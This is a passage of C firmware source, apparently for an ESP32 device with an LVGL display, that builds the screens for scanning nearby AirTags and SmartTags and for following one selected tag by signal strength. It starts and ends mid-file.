    if (dev_idx < 0 || dev_idx >= bt_device_count) return;
    bt_device_info_t *dev = &bt_devices[dev_idx];

    // Set up tracking globals (same as bt_locator_device_selected_cb)
    memcpy(bt_tracking_mac, dev->addr, 6);
    bt_tracking_rssi = dev->rssi;
    bt_tracking_found = false;
    bt_tracking_name[0] = '\0';
    if (dev->name[0] != '\0') {
        strncpy(bt_tracking_name, dev->name, sizeof(bt_tracking_name) - 1);
        bt_tracking_name[sizeof(bt_tracking_name) - 1] = '\0';
    }

    // Stop AirTag scan task if running
    if (airtag_scan_active) {
        airtag_scan_active = false;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    // Build a minimal tracking UI using the BT Locator framework
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    char title_buf[48];
    snprintf(title_buf, sizeof(title_buf), "%s Tracker",
             dev->is_airtag ? "AirTag" : "SmartTag");
    create_function_page_base(title_buf);

    bt_locator_ui_active = true;
    bt_locator_tracking_active = false;
    bt_tracking_mode = false;

    // Content container
    bt_locator_content = lv_obj_create(function_page);
    lv_obj_set_size(bt_locator_content, lv_pct(100), LCD_V_RES - 30 - 43);
    lv_obj_align(bt_locator_content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(bt_locator_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(bt_locator_content, 0, 0);
    lv_obj_set_style_pad_all(bt_locator_content, 5, 0);
    lv_obj_clear_flag(bt_locator_content, LV_OBJ_FLAG_SCROLLABLE);

    // RSSI label (large, green)
    bt_locator_rssi_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_rssi_label, "RSSI: ---");
    lv_obj_set_style_text_color(bt_locator_rssi_label, lv_color_make(0, 255, 0), 0);
    lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_20, 0);
    lv_obj_align(bt_locator_rssi_label, LV_ALIGN_CENTER, 0, -30);

    // MAC label
    bt_locator_mac_label = lv_label_create(bt_locator_content);
    char addr_str[18];
    bt_format_addr(bt_tracking_mac, addr_str);
    char mac_text[48];
    snprintf(mac_text, sizeof(mac_text), "Device: %s", addr_str);
    lv_label_set_text(bt_locator_mac_label, mac_text);
    lv_obj_set_style_text_color(bt_locator_mac_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_mac_label, &lv_font_montserrat_14, 0);
    lv_obj_align(bt_locator_mac_label, LV_ALIGN_CENTER, 0, 10);

    // Name label (if available)
    if (bt_tracking_name[0] != '\0') {
        lv_obj_t *name_lbl = lv_label_create(bt_locator_content);
        lv_label_set_text(name_lbl, bt_tracking_name);
        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
        lv_obj_align(name_lbl, LV_ALIGN_CENTER, 0, 32);
    }

    // Status label
    bt_locator_status_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_status_label, "Tracking device...");
    lv_obj_set_style_text_color(bt_locator_status_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_status_label, &lv_font_montserrat_14, 0);
    lv_obj_align(bt_locator_status_label, LV_ALIGN_CENTER, 0, -60);

    // Exit button (compact row)
    bt_locator_exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_locator_exit_btn, 110, 28);
    lv_obj_align(bt_locator_exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_locator_exit_btn, 0, 0);
    lv_obj_set_style_radius(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_shadow_width(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_shadow_color(bt_locator_exit_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(bt_locator_exit_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_pad_hor(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_pad_column(bt_locator_exit_btn, 4, 0);
    lv_obj_set_flex_flow(bt_locator_exit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_locator_exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t *exit_icon2 = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_icon2, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(exit_icon2, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(exit_icon2, lv_color_white(), 0);
    lv_obj_t *exit_text2 = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_text2, "Back");
    lv_obj_set_style_text_font(exit_text2, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_text2, lv_color_white(), 0);
    lv_obj_add_event_cb(bt_locator_exit_btn, bt_locator_exit_cb, LV_EVENT_CLICKED, NULL);

    // Start tracking task
    bt_locator_tracking_active = true;
    bt_tracking_mode = true;

    BaseType_t task_ret = xTaskCreate(
        bt_locator_tracking_task,
        "bt_locator_task",
        4096,
        NULL,
        5,
        &bt_locator_task_handle
    );

    if (task_ret != pdPASS) {
        bt_locator_tracking_active = false;
        bt_tracking_mode = false;
        if (bt_locator_status_label) {
            lv_label_set_text(bt_locator_status_label, "Failed to start tracking!");
        }
    }
}

// Show AirTag scanner screen
static void show_airtag_scan_screen(void)
{
    // Ensure BLE mode is active
    if (!ensure_ble_mode()) {
        ESP_LOGE(TAG, "Failed to switch to BLE mode for AirTag scanner");
        return;
    }
    
    create_function_page_base("Airtag Scanner");
    
    // Status label - "Scan in progress..." (centered, visible while scanning)
    airtag_scan_status_label = lv_label_create(function_page);
    lv_label_set_text(airtag_scan_status_label, LV_SYMBOL_BLUETOOTH "  Scan in progress...");
    lv_obj_set_style_text_align(airtag_scan_status_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(airtag_scan_status_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(airtag_scan_status_label, ui_text_color(), 0);
    lv_obj_align(airtag_scan_status_label, LV_ALIGN_CENTER, 0, -105);

    // Stats label 1: "Air Tags: X\nSmart Tags: X" (two lines, large font)
    airtag_scan_stats_label1 = lv_label_create(function_page);
    lv_label_set_text(airtag_scan_stats_label1, "Air Tags: 0\nSmart Tags: 0");
    lv_obj_set_style_text_align(airtag_scan_stats_label1, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(airtag_scan_stats_label1, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(airtag_scan_stats_label1, ui_text_color(), 0);
    lv_obj_align(airtag_scan_stats_label1, LV_ALIGN_CENTER, 0, -85);
    lv_obj_add_flag(airtag_scan_stats_label1, LV_OBJ_FLAG_HIDDEN);

    // Stats label 2: "Other BT Devices: X"
    airtag_scan_stats_label2 = lv_label_create(function_page);
    lv_label_set_text(airtag_scan_stats_label2, "Other BT Devices: 0");
    lv_obj_set_style_text_align(airtag_scan_stats_label2, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(airtag_scan_stats_label2, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(airtag_scan_stats_label2, lv_color_make(176, 176, 176), 0);
    lv_obj_align(airtag_scan_stats_label2, LV_ALIGN_CENTER, 0, -20);
    lv_obj_add_flag(airtag_scan_stats_label2, LV_OBJ_FLAG_HIDDEN);

    // Stats label 3: "Total BT devices: X"
    airtag_scan_stats_label3 = lv_label_create(function_page);
    lv_label_set_text(airtag_scan_stats_label3, "Total BT devices: 0");
    lv_obj_set_style_text_align(airtag_scan_stats_label3, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_style_text_font(airtag_scan_stats_label3, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(airtag_scan_stats_label3, lv_color_make(176, 176, 176), 0);
    lv_obj_align(airtag_scan_stats_label3, LV_ALIGN_CENTER, 0, 5);
    lv_obj_add_flag(airtag_scan_stats_label3, LV_OBJ_FLAG_HIDDEN);

    // "View Found Tags" button — shown when at least one AirTag or SmartTag detected
    airtag_view_tags_btn = lv_btn_create(function_page);
    lv_obj_set_size(airtag_view_tags_btn, 160, 44);
    lv_obj_align(airtag_view_tags_btn, LV_ALIGN_CENTER, 0, 55);
    lv_obj_set_style_bg_color(airtag_view_tags_btn, COLOR_MATERIAL_BLUE, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(airtag_view_tags_btn, lv_color_lighten(COLOR_MATERIAL_BLUE, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(airtag_view_tags_btn, 0, 0);
    lv_obj_set_style_radius(airtag_view_tags_btn, 10, 0);
    lv_obj_set_style_shadow_width(airtag_view_tags_btn, 6, 0);
    lv_obj_set_style_shadow_color(airtag_view_tags_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(airtag_view_tags_btn, LV_OPA_40, 0);
    lv_obj_t *view_tags_label = lv_label_create(airtag_view_tags_btn);
    lv_label_set_text(view_tags_label, LV_SYMBOL_LIST "  View Found Tags");
    lv_obj_set_style_text_font(view_tags_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(view_tags_label, lv_color_white(), 0);
    lv_obj_center(view_tags_label);
    lv_obj_add_event_cb(airtag_view_tags_btn, airtag_view_tags_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_flag(airtag_view_tags_btn, LV_OBJ_FLAG_HIDDEN);

    // Exit button (compact row)
    lv_obj_t *exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(exit_btn, 110, 28);
    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_set_style_shadow_width(exit_btn, 4, 0);
    lv_obj_set_style_shadow_color(exit_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(exit_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(exit_btn, 4, 0);
    lv_obj_set_style_pad_hor(exit_btn, 8, 0);
    lv_obj_set_style_pad_column(exit_btn, 4, 0);
    lv_obj_set_flex_flow(exit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *exit_icon = lv_label_create(exit_btn);
    lv_label_set_text(exit_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(exit_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(exit_icon, ui_text_color(), 0);

    lv_obj_t *exit_text = lv_label_create(exit_btn);
    lv_label_set_text(exit_text, "Exit");
    lv_obj_set_style_text_font(exit_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_text, ui_text_color(), 0);

    lv_obj_add_event_cb(exit_btn, airtag_scan_exit_cb, LV_EVENT_CLICKED, NULL);
    
    // Set UI active and start scanning
    airtag_scan_ui_active = true;
    airtag_scan_active = true;
    airtag_scan_update_flag = false;
    
    // Create scanning task with PSRAM stack
    airtag_scan_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (airtag_scan_task_stack) {
        airtag_scan_task_handle = xTaskCreateStatic(
            airtag_scan_task,
            "airtag_scan",
            4096,
            NULL,
            5,
            airtag_scan_task_stack,
            &airtag_scan_task_buffer
        );
    } else {
        ESP_LOGE(TAG, "Failed to allocate AirTag scan task stack");
    }
    
    ESP_LOGI(TAG, "AirTag scanner started");
}
